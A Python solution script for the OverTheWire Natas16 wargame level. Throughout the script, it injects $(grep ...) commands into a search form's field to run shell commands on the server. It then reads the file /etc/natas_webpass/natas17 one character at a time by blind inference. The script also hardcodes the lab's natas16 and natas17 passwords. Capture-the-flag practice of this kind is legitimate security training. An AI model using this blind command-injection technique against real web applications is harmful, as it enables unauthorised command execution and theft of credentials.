import requests
import bs4
import re
import string


# configuration for natas16
USERNAME = 'natas16'
PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
URL = 'http://natas16.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# according to the source code, there are few symbols that are not filtered out by the regex expression
# which includes $, (, ), {, }
# one way we can execute a command is through the use of $()
# for example, $(grep a /etc/natas_webpass/natas17)
# the idea of the attack is similar to blind SQL injection, in this case, it would be blind OS injection
# see the following examples:
# I. the word africans is in the dictionary.txt file, therefore, it will be returned to us by the webpage as the result of our search
data = {
    'needle' : 'Africans',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# II. case 1: next, we execute specific command using $() and send it along with our previous search query
data = {
    'needle' : 'Africans$(grep b /etc/natas_webpass/natas17)',
    'submit' : 'submit'
}
# essentially, the command will search for the letter 'b' in the file /etc/natas_webpass/natas17
# if it found it, it should return the word 'Africans' concatenated with the password, which is not in
# dictionary.txt
response = session.post(URL, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# as we can see, nothing is returned as a result of our search, which means b is a letter in the password
# III. case 2: if the letter is not in the password,
# the word 'Africans' will be returned as the result of our search, 
# which means that the letter is not in the password as nothing is concatenated with the word 'Africans'
data = {
    'needle' : 'Africans$(grep a /etc/natas_webpass/natas17)',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# as we can see, the letter 'a' is not in the password as the password is not concatenated with the search result


possible_chars = string.ascii_letters + string.digits
password_chars = ""
# get all possible letters in the password
for char in possible_chars:
    print(f'password_chars: {password_chars + char}', end='\r')
    data = {
        'needle' : f'Africans$(grep {char} /etc/natas_webpass/natas17)',
        'submit' : 'submit'
    }
    response = session.post(URL, data=data)
    # if the word Africans is not returned as the search result, then the letter is in the password
    if not re.search(r'Africans', response.text):
        password_chars += char
        print(f'password_chars: {password_chars}', end='\r')
print('\n')


password = ""
for i in range(32):
    for char in password_chars:
        print(f'password: {password + char}', end='\r')
        data = {
            # use the regex symbol ^ to mark the beginning of the word
            'needle' : f'Africans$(grep ^{password + char} /etc/natas_webpass/natas17)',
            'submit' : 'submit'
        }
        response = session.post(URL, data=data)
        if not re.search(r'Africans', response.text):
            password += char
            print(f'password: {password}', end='\r')
            break
print('\n')


# natas17 password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
print(f'natas17 password: {password}')